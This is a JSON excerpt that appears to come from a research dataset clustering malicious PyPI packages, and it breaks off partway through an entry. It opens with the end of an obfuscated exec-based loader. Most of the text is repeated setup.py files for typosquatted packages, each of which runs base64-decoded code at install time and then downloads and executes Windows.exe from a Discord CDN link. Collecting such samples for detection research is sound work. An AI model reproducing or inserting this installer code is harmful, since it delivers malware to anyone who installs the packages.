777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                \n\nfrom .bettercolor_file import *\nfrom colorama import *\ninitialize()"
      }
    ]
  },
  {
    "cluster_id": 28,
    "size": 31,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-beautifulsoup-requests-v12.15.13",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '12.15.13'\nDESCRIPTION = 'A code linting tool for Python'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"beautifulsoup-requests\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-beautifulsoup-scikit-learn-v2.4.9",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '2.4.9'\nDESCRIPTION = 'A package for network communication'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"beautifulsoup-scikit-learn\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-crypto-pygame-v10.14.7",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '10.14.7'\nDESCRIPTION = 'A library for web scraping and data extraction'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"crypto-pygame\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-django-pyyaml-v20.17.15",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '20.17.15'\nDESCRIPTION = 'A framework for creating RESTful APIs'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"django-pyyaml\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-install-pytest-v1.12.7",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '1.12.7'\nDESCRIPTION = 'A tool for debugging and profiling Python code'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"install-pytest\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-keras-beautifulsoup-v2.9.2",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '2.9.2'\nDESCRIPTION = 'A Python library for data manipulation and analysis'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"keras-beautifulsoup\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-matplotlib-flask-v7.15.10",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '7.15.10'\nDESCRIPTION = 'A module for working with files and directories'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"matplotlib-flask\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-matplotlib-req-v17.6.16",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '17.6.16'\nDESCRIPTION = 'A lightweight and extensible testing framework'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"matplotlib-req\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-matplotlib-requests-v16.12.4",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '16.12.4'\nDESCRIPTION = 'A library for web scraping and data extraction'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"matplotlib-requests\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-matplotlib-sqlalchemy-v16.18.4",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '16.18.4'\nDESCRIPTION = 'A library for web scraping and data extraction'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"matplotlib-sqlalchemy\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-os-numpy-v3.19.4",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '3.19.4'\nDESCRIPTION = 'A Python library for data manipulation and analysis'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"os-numpy\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-print-django-v3.9.10",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '3.9.10'\nDESCRIPTION = 'A module for working with files and directories'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"Print-django\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pygame-install-v17.14.20",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '17.14.20'\nDESCRIPTION = 'A tool for debugging and profiling Python code'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pygame-install\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pygame-pytorch-v3.4.19",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '3.4.19'\nDESCRIPTION = 'A module for working with files and directories'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pygame-pytorch\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = 